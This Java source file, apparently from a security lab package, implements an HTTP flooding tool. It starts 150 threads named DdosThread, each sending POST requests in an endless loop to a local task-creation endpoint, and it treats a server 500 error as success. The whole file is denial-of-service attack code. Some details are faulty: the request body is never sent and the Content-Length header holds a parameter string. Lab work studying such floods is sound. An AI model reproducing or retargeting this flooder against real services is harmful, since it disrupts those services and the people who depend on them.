package FOIS_LAB;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

public class HTTPFlooder {
    static int progress;
    static Map<String, String> flood_req= new HashMap<>();

    HTTPFlooder(int progress){
        HTTPFlooder.progress = progress;
    }

    public static void main(String... args) throws Exception {
        for (int i = 0; i < 150; i++) {
            DdosThread thread = new DdosThread();
            thread.start();
        }
    }

    public static class DdosThread extends Thread {

        private AtomicBoolean running = new AtomicBoolean(true);
        private final String request = HelperFunctions.schemeAdder("localhost:5000/tasks/create");
        private final URL url;


        String param = null;

        public DdosThread() throws Exception {
            url = new URL(request);
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        }


        @Override
        public void run() {
            while (running.get()) {
                try {
                    requestFlood();
                } catch (Exception e) {

                }
            }
        }

        public void requestFlood() throws Exception {

            flood_req.put("title", "task");
            flood_req.put("description", "It is a basic task");
            flood_req.put("due_date", "today");


            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Host", "localhost");
            connection.setRequestProperty("User-Agent", "Java Program");
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            connection.setRequestProperty("Content-Length", param);
            //connection.getOutputStream().write();

            System.out.println(this + " " + connection.getResponseCode() +" "+connection.getResponseMessage());
            connection.getInputStream();

            if(connection.getResponseCode() == 500) HTTPFlooder.progress = 100;
            else progress = 0;
        }
    }

}
